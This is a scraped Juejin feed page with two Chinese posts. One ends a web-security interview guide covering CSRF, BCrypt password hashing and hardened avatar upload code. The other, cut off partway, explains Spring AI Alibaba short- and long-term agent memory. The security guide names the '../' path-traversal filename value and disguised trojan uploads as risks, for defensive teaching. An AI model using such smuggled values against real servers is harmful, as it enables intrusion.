</code></pre>
<p><strong>解释</strong>：就像银行柜台转账，不仅要看身份证（登录状态），还要核对预留手机号收到的验证码（CSRF Token），要双重确认是否是本人操作。</p>
<h3 data-id="heading-2">3. 密码安全</h3>
<p><strong>案例</strong>：某网站用户数据泄露，100万用户的密码被公开。调查发现，网站把密码直接存到数据库，没有做任何处理。更可怕的是，很多用户在多个网站用同一个密码...</p>
<p><strong>常见的密码错误</strong>：</p>
<ul>
<li>密码明文存储（直接存原始密码）</li>
<li>只做简单MD5加密（很容易破解）</li>
<li>不限制登录尝试次数（允许暴力破解）</li>
</ul>
<p><strong>正确做法</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 安全的密码存储（使用BCrypt）</span>
<span class="hljs-keyword">import</span> org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordSecurity</span> {
    
    <span class="hljs-comment">// 创建加密器</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">BCryptPasswordEncoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>(<span class="hljs-number">12</span>);
    
    <span class="hljs-comment">// 用户注册时：加密存储</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">registerUser</span><span class="hljs-params">(String username, String rawPassword)</span> {
        <span class="hljs-comment">// 加密密码</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">encodedPassword</span> <span class="hljs-operator">=</span> encoder.encode(rawPassword);
        <span class="hljs-comment">// 保存到数据库</span>
        userDao.save(username, encodedPassword);
        <span class="hljs-keyword">return</span> <span class="hljs-string">"注册成功"</span>;
    }
    
    <span class="hljs-comment">// 用户登录时：验证密码</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loginUser</span><span class="hljs-params">(String username, String rawPassword)</span> {
        <span class="hljs-comment">// 从数据库获取加密后的密码</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">encodedPassword</span> <span class="hljs-operator">=</span> userDao.getPassword(username);
        <span class="hljs-comment">// 验证密码是否匹配</span>
        <span class="hljs-keyword">return</span> encoder.matches(rawPassword, encodedPassword);
    }
}
</code></pre>
<p><strong>为什么BCrypt更安全</strong>？</p>
<ol>
<li><strong>加盐</strong>：每个人的密码都加了不同的随机字符串，防止彩虹表攻击</li>
<li><strong>慢加密</strong>：故意设计得很慢，让黑客难以暴力破解</li>
<li><strong>自适应</strong>：随着计算机变快，可以调整难度</li>
</ol>
<p><strong>额外建议</strong>：</p>
<ul>
<li>重要操作（如修改密码、大额转账）要求二次验证（短信/邮箱）</li>
<li>登录失败5次后锁定账户一段时间</li>
<li>定期提醒用户修改密码</li>
</ul>
<h3 data-id="heading-3">4. 文件上传</h3>
<p><strong>小故事</strong>：某论坛允许用户上传头像，结果有黑客上传了一个图片，实际是个控制服务器的程序。几天后，整个服务器被用来挖矿，网站瘫痪...</p>
<p><strong>风险在哪</strong>？</p>
<ul>
<li>上传的图片可能是木马程序</li>
<li>文件名可能包含"../"跳到其他目录</li>
<li>超大文件可能导致服务器崩溃</li>
</ul>
<p><strong>安全上传四步法</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PostMapping("/upload-avatar")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadAvatar</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam("file")</span> MultipartFile file)</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 1. 检查文件大小（限制1MB）</span>
        <span class="hljs-keyword">if</span> (file.getSize() &gt; <span class="hljs-number">1</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"文件不能超过1MB"</span>;
        }
        
        <span class="hljs-comment">// 2. 检查文件类型（只允许图片）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">originalName</span> <span class="hljs-operator">=</span> file.getOriginalFilename();
        <span class="hljs-type">String</span> <span class="hljs-variable">extension</span> <span class="hljs-operator">=</span> originalName.substring(originalName.lastIndexOf(<span class="hljs-string">"."</span>) + <span class="hljs-number">1</span>).toLowerCase();
        
        <span class="hljs-keyword">if</span> (!Arrays.asList(<span class="hljs-string">"jpg"</span>, <span class="hljs-string">"jpeg"</span>, <span class="hljs-string">"png"</span>, <span class="hljs-string">"gif"</span>).contains(extension)) {
            <span class="hljs-keyword">return</span> <span class="hljs-string">"只允许上传图片文件"</span>;
        }
        
        <span class="hljs-comment">// 3. 生成安全的文件名（避免特殊字符和路径问题）</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">safeName</span> <span class="hljs-operator">=</span> UUID.randomUUID() + <span class="hljs-string">"."</span> + extension;
        
        <span class="hljs-comment">// 4. 保存到安全位置</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">savePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/safe/uploads/"</span> + safeName;
        file.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(savePath));
        
        <span class="hljs-keyword">return</span> <span class="hljs-string">"上传成功，访问地址：/avatars/"</span> + safeName;
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"上传失败："</span> + e.getMessage();
    }
}
</code></pre>
<p><strong>提示</strong>：上传的文件不要直接放在网站目录下，而是通过程序控制访问。这样即使有人上传了恶意文件，也无法直接执行。</p>
<h2 data-id="heading-4">面试加分项：安全思维</h2>
<p>技术很重要，同时面试官也看重你的<strong>思维方式</strong>。以下3点，说出来能加分：</p>
<h3 data-id="heading-5">1. 安全是过程，不是功能</h3>
<p>很多团队把安全当成项目结束前才考虑的事。实际上，<strong>安全应该贯穿整个开发过程</strong>：</p>
<ul>
<li>写需求时：考虑哪些数据敏感，需要保护</li>
<li>设计系统时：想想可能有哪些风险点</li>
<li>写代码时：遵循安全编码规范</li>
<li>测试时：包含安全测试</li>
<li>上线后：监控异常行为</li>
</ul>
<h3 data-id="heading-6">2. 最小权限原则</h3>
<p>简单说：<strong>只给必要的权限</strong>。</p>
<p>应用到开发中：</p>
<ul>
<li>数据库账号：不要用root账号连接数据库，创建专用账号，只给必要权限</li>
<li>后台管理：普通编辑不能删除用户，管理员才能</li>
<li>API权限：用户只能看到自己的数据，看不到别人的</li>
</ul>
<h3 data-id="heading-7">3. 多层防御</h3>
<p>不要只靠一种防护，就像家里既有门锁，也有防盗窗。安全也一样：</p>
<ul>
<li>网络层：防火墙挡住可疑访问</li>
<li>应用层：输入验证、权限控制</li>
<li>数据层：敏感数据加密</li>
<li>业务层：异常操作监控</li>
</ul>
<h2 data-id="heading-8">面试怎么回答？模板来了</h2>
<p>当面试官问"网络安全了解多少"，你可以这样说：</p>
<blockquote>
<p>"我认为安全不是某个部门的事，而是每个开发者的责任。在我的开发经验中，我主要关注几个常见风险：</p>
</blockquote>
<blockquote>
<p>第一，防范XSS攻击。我会对用户输入进行验证，对输出内容做编码处理，确保用户输入的内容不会被当作代码执行。</p>
</blockquote>
<blockquote>
<p>第二，防范CSRF攻击。我会在表单中使用CSRF令牌，重要操作要求二次验证，确保请求是用户真实意愿。</p>
</blockquote>
<blockquote>
<p>第三，安全存储密码。我使用BCrypt算法加密存储密码，而不是明文或简单MD5，重要操作增加额外验证。</p>
</blockquote>
<blockquote>
<p>第四，安全处理文件上传。我会限制文件类型、大小，生成安全文件名，将上传的文件放在非Web访问目录。</p>
</blockquote>
<blockquote>
<p>本文首发于公众号：程序员大华，专注分享前后端开发的实战笔记。关注我，少走弯路，一起进步！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一站式了解Spring AI Alibaba的Memory机制]]></title>    <link>https://juejin.cn/post/7596990822127566886</link>    <guid>https://juejin.cn/post/7596990822127566886</guid>    <pubDate>2026-01-20T05:47:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596990822127566886" data-draft-id="7596990822127026214" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一站式了解Spring AI Alibaba的Memory机制"/> <meta itemprop="keywords" content="后端,人工智能,架构"/> <meta itemprop="datePublished" content="2026-01-20T05:47:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="想用offer打牌"/> <meta itemprop="url" content="https://juejin.cn/user/578781641968972"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一站式了解Spring AI Alibaba的Memory机制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/578781641968972/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    想用offer打牌
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T05:47:57.000Z" title="Tue Jan 20 2026 05:47:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.8;font-weight:400;font-size:16px;word-spacing:2px;letter-spacing:2px;overflow-x:hidden;color:#3e3e3e;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{padding-bottom:12px;font-size:24px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:1.2em;border-bottom:2px solid #ef7060;word-spacing:0!important;letter-spacing:0!important;font-size:inherit;line-height:inherit;display:block;font-weight:400;background:#ef7060;color:#fff;padding:10px;border-top-right-radius:3px;border-top-left-radius:3px;margin-right:3px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>我相信大家在平时一定使用过网页对话chatbot，国产的有deepseek、Qwen等，国外的有ChatGPT、Gemini、Grok等。在我们使用的期间，我们会发现这些chatbot会记住我们这次对话的上下文，甚至之前的对话的某些信息，如果你们对为什么LLM能记住我们的信息感兴趣，那么接着往下看吧！</p>
<h2 data-id="heading-1">错误纠正</h2>
<p>很多人不了解大模型或者不了解大模型应用开发的，就常常认为大模型底层就是会有记忆机制的，即内置Memory。这种想法是错误的，大模型底层并没有记忆机制，而是stateless(无状态)。</p>
<p>1.基础大模型（如 Qwen）的行为(LLM)</p>
<ul>
<li>默认情况下，大语言模型（包括 Qwen 系列）是<strong>无状态的</strong>：每次请求都是独立的，模型不会自动记住你之前的对话内容。</li>
<li>如果你在一次对话中发送多轮消息（例如通过 API 的 <code>messages</code> 字段传入历史），那是由<strong>调用方</strong>（即你的应用）负责维护对话历史，而不是模型自己存储。</li>
</ul>
<p>2.Memory 机制是应用层的功能</p>
<ul>
<li>“Memory”通常是指在构建智能体（Agent）或对话系统时，为了实现上下文记忆、长期记忆、用户偏好记录等功能而<strong>额外引入的模块</strong>。</li>
<li>例如，在 LangChain、LlamaIndex 或阿里云百炼平台中，开发者可以配置短期记忆（如最近几轮对话）或长期记忆（如向量数据库存储的历史信息），并在每次生成回复前将相关记忆注入 prompt。</li>
<li>这种 Memory 管理是由<strong>应用框架或开发者代码</strong>实现的，不是模型原生能力。</li>
</ul>
<h2 data-id="heading-2">Memory</h2>
<p>那么像chatbot这些大模型应用，是如何维持记忆呢？那么维护记忆万一超过了模型能承受的上下文，怎么办？</p>
<p>要了解这些问题，我们首先得搞懂，<strong>什么是Memory</strong>。</p>
<p>Memory分为短期记忆和长期记忆，接下来我们分别说说，尽量简单易懂。</p>
<h3 data-id="heading-3">短期Memory</h3>
<p>短期记忆（Short-term Memory）</p>
<ul>
<li>
<p><strong>定义</strong>：指在<strong>单次对话会话（session）中</strong>保留的上下文信息。</p>
</li>
<li>
<p><strong>典型实现</strong>：将用户与系统单次会话中的最近几轮的对话历史（prompt + response）作为上下文，一起输入给大模型。</p>
</li>
<li>
<p>特点：</p>
<ul>
<li>仅在当前会话有效；</li>
<li>会话结束后通常被丢弃（除非主动保存）；</li>
<li>受限于模型的上下文长度（如 Qwen-Max 支持 32768 tokens）；</li>
<li>是实现多轮对话连贯性的基础。</li>
</ul>
</li>
<li>
<p>例子：</p>
<blockquote>
<p>用户：我叫小明。 助手：你好，小明！ 用户：我今年多大？ → 助手能回答，是因为“我叫小明”这句还在短期记忆（即对话历史）中</p>
</blockquote>
</li>
</ul>
<p>短期记忆一般大模型应用都会自动开启的，但是每个应用对短期记忆的策略都会不一样，所以体验上也不一样。</p>
<h3 data-id="heading-4">长期Memory</h3>
<p>长期记忆（Long-term Memory）</p>
<ul>
<li>
<p><strong>定义</strong>：跨越<strong>多个会话</strong>、持久化存储的用户信息或交互历史。</p>
</li>
<li>
<p>典型实现：</p>
<ul>
<li>将关键信息（如用户偏好、身份、历史任务）提取后存入数据库或向量库；</li>
<li>下次对话时通过检索（Retrieval）机制召回相关内容，并注入到 prompt 中。</li>
</ul>
</li>
<li>
<p>特点：</p>
<ul>
<li>需要显式设计（如使用向量数据库 + embedding 检索）；</li>
<li>不是所有系统都默认开启；</li>
<li>涉及隐私和数据安全，通常需用户授权；</li>
<li>属于高级功能，常见于智能体（Agent）或个性化助手。</li>
</ul>
</li>
<li>
<p>例子：</p>
<blockquote>
<p>上周用户说：“我喜欢喝美式咖啡。” 一周后再次对话，系统说：“今天还想来一杯美式吗？” → 这说明系统通过长期记忆记住了偏好。</p>
</blockquote>
</li>
</ul>
<p>以Gemini为例子，你可以在这里添加想让Gemini记住你的相关信息，或者在某次对话中直接prompt让其记住也是可以的。这样就是长期Memory，每次Gemini都会在某些情景下触发相关的长期记忆，策略不同，输出也会不同</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb3439edfb8d46f1a93120640aff551c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oOz55Sob2ZmZXLmiZPniYw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769492876&amp;x-signature=2IM1STkkuLy7QVhx6EVKAuLUWiM%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-5">SAA的Memory机制</h2>
<p>ok，现在回归正题，来讲讲SAA的Memory机制，如果还有想有更深的了解的兄弟可以先去看看这两篇文章，再回来应该能更好的理解</p>
<p>1.Spring AI vs Spring AI Alibaba</p>
<p><a href="https://juejin.cn/post/7596181746062508059" target="_blank" title="https://juejin.cn/post/7596181746062508059">juejin.cn/post/759618…</a></p>
<p>2.逃出结构化思维：从向量，向量数据库到RAG</p>
<p><a href="https://juejin.cn/post/7587074669818134554" target="_blank" title="https://juejin.cn/post/7587074669818134554">juejin.cn/post/758707…</a></p>
<p>SAA本质上是一个AI应用开发框架，可以开发agent，multi-agent和工作流等等，那么必然需要使用底层LLM，然而我们前面已经说过了LLM实际上是无状态的，那么LLM应用的相关记忆必定是由我们上层应用来开发和管理的。</p>
<p>即如果你使用的是 <strong>Qwen 的 API（如 dashscope）</strong> ，你需要自己维护对话历史并作为输入传入。</p>
<h3 data-id="heading-6">SAA的Memory机制的架构</h3>
<p>下面是SAA实现两种Memory的架构图,其中左下角的箭头(指向ModelHook)应该放置到中间的，画错了就将就看吧</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18a0e499cf7e49fea80e248203b7e7f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oOz55Sob2ZmZXLmiZPniYw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769492876&amp;x-signature=8R8dwVnosD%2BXP9YQwGV3Pq6f%2FQE%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">维护短期记忆</h3>
<h4 data-id="heading-8">如何添加短期记忆</h4>
<p>在 Spring AI Alibaba 中，要向 Agent 添加短期记忆（会话级持久化），你需要在创建 Agent 时指定 <code>checkpointer</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.checkpoint.savers.RedisSaver;
<span class="hljs-keyword">import</span> org.redisson.api.RedissonClient;

<span class="hljs-comment">// 配置 Redis checkpointer</span>
<span class="hljs-type">RedisSaver</span> <span class="hljs-variable">redisSaver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisSaver</span>(redissonClient);

<span class="hljs-type">ReactAgent</span> <span class="hljs-variable">agent</span> <span class="hljs-operator">=</span> ReactAgent.builder()
    .name(<span class="hljs-string">"my_agent"</span>)
    .model(chatModel)
    .tools(getUserInfoTool)
    .saver(redisSaver)
    .build();
    
<span class="hljs-comment">// 使用 thread_id 维护对话上下文  </span>
<span class="hljs-type">RunnableConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> RunnableConfig.builder()  
    .threadId(<span class="hljs-string">"1"</span>) <span class="hljs-comment">// threadId 指定会话 ID  </span>
    .build();  
  
agent.call(<span class="hljs-string">"你好！我叫 Bob。"</span>, config);
</code></pre>
<h4 data-id="heading-9">扩展短期记忆</h4>
<p>我们还可以修改和管理记忆。
默认情况下，Agent 使用状态通过 <code>messages</code> 键管理短期记忆，特别是对话历史。</p>
<p>你可以通过在工具或 Hook 中访问和修改状态来扩展记忆功能</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.agent.hook.ModelHook;
<span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.agent.hook.HookPosition;
<span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.OverAllState;
<span class="hljs-keyword">import</span> com.alibaba.cloud.ai.graph.RunnableConfig;
<span class="hljs-keyword">import</span> org.springframework.ai.chat.messages.Message;
<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Map;
<span class="hljs-keyword">import</span> java.util.Optional;
<span class="hljs-keyword">import</span> java.util.concurrent.CompletableFuture;

<span class="hljs-comment">// 在 Hook 中访问和修改状态</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomMemoryHook</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ModelHook</span> {

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"custom_memory"</span>;
}

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> HookPosition[] getHookPositions() {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HookPosition</span>[]{HookPosition.BEFORE_MODEL};
}

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> CompletableFuture&lt;Map&lt;String, Object&gt;&gt; <span class="hljs-title function_">beforeModel</span><span class="hljs-params">(OverAllState state, RunnableConfig config)</span> {
    <span class="hljs-comment">// 访问消息历史</span>
    Optional&lt;Object&gt; messagesOpt = state.value(<span class="hljs-string">"messages"</span>);
    <span class="hljs-keyword">if</span> (messagesOpt.isPresent()) {
        List&lt;Message&gt; messages = (List&lt;Message&gt;) messagesOpt.get();
    <span class="hljs-comment">// 处理消息...</span>
}

    <span class="hljs-comment">// 添加自定义状态</span>
    <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(Map.of(
        <span class="hljs-string">"user_id"</span>, <span class="hljs-string">"user_123"</span>,
        <span class="hljs-string">"preferences"</span>, Map.of(<span class="hljs-string">"theme"</span>, <span class="hljs-string">"dark"</span>)
    ));
}

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> CompletableFuture&lt;Map&lt;String, Object&gt;&gt; <span class="hljs-title function_">afterModel</span><span class="hljs-params">(OverAllState state, RunnableConfig config)</span> {
    <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(Map.of());
    }
}
</code></pre>
<h4 data-id="heading-10">管理短期记忆</h4>
<p>一个会话中，如果用户一直对话，整个会话的上下文就会越来越长，最后就会超过该大模型所能承受的上下文限制。</p>
<p>保留所有对话历史是实现短期记忆最常见的形式。但较长的对话对历史可能会导致大模型 LLM 上下文窗口超限，导致上下文丢失或报错。</p>
<p>即使你在使用的大模型上下文长度足够大，大多数模型在处理较长上下文时的表现仍然很差。因为很多模型会被过时或偏离主题的内容"分散注意力"。同时，过长的上下文，还会带来响应时间变长、Token 成本增加等问题。</p>
<p>在 Spring AI ALibaba 中，ReactAgent 使用 messages 记录和传递上下文，其中包括指令（SystemMessage）和输入（UserMessage）。在 ReactAgent 中，消息（Message）在用户输入和模型响应之间交替，导致消息列表随着时间的推移变得越来越长。由于上下文窗口有限，许多应用程序可以从使用技术来移除或"忘记"过时信息中受益，即 “上下文工程”。</p>
<p>作为后端，我们通常采取以下几种策略来模拟“记忆”：</p>
<ul>
<li><strong>Sliding Window（滑动窗口）：</strong> 只保留最近的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span></span> 轮对话，丢弃最早的记录。</li>
<li><strong>Summary Memory（摘要记忆）：</strong> 当对话过长时，调用大模型对之前的对话做一个简短总结，后续只带上这个 <code>Summary</code>。</li>
<li><strong>Vector Database（向量数据库/RAG）：</strong> 将历史对话存入向量库（如 Milvus, Pinecone）。当用户提问时，通过语义搜索检索出最相关的历史片段（Top-K），塞进 Context 传给模型。</li>
</ul>
<h3 data-id="heading-11">维护长期记忆</h3>
<h4 data-id="heading-12">长期记忆的检索过程</h4>
<p>对于后端开发人员来说，长期记忆的检索过程其实就是一个标准的 <strong>“语义检索 + RAG (Retrieval-Augmented Generation)”</strong> 工作流。</p>
<p>你可以把它类比为：<strong>全文搜索（Elasticsearch）的升级版</strong>。不同于关键词匹配，<strong>它是基于“意思”来匹配</strong>。</p>
<hr/>
<p>整个过程可以分为 <strong>“存入”</strong> 和 <strong>“检索”</strong> 两个阶段：</p>
<h5 data-id="heading-13">1. 存入阶段（写入/索引）</h5>
<p>当一段对话结束或产生新的知识时：</p>
<ol>
<li><strong>切片 (Chunking)</strong> ：将长文本切分成合适的大小（例如 512 tokens）。</li>
<li><strong>向量化 (Embedding)</strong> ：调用 Embedding 模型（如 OpenAI 的 <code>text-embedding-3-small</code>）将文本转为高维向量（如 1536 维的浮点数数组）。</li>
<li><strong>入库</strong>：将向量和原始文本、Metadata（如 <code>user_id</code>, <code>timestamp</code>）存入向量数据库（Redis Vector Search, Milvus, 或 Pinecone）。</li>
</ol>
<h5 data-id="heading-14">2. 检索阶段（读取/召回）</h5>
<p>当用户提出一个新问题，系统需要“回想起”以前的事情：</p>
<ul>
<li>
<p>Step A: 问题向量化</p>
<p>将用户的提问（Query）同样通过 Embedding 模型转为一个向量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>V</mi><mrow><mi>q</mi><mi>u</mi><mi>e</mi><mi>r</mi><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">V_{query}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ery</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>。</p>
</li>
<li>
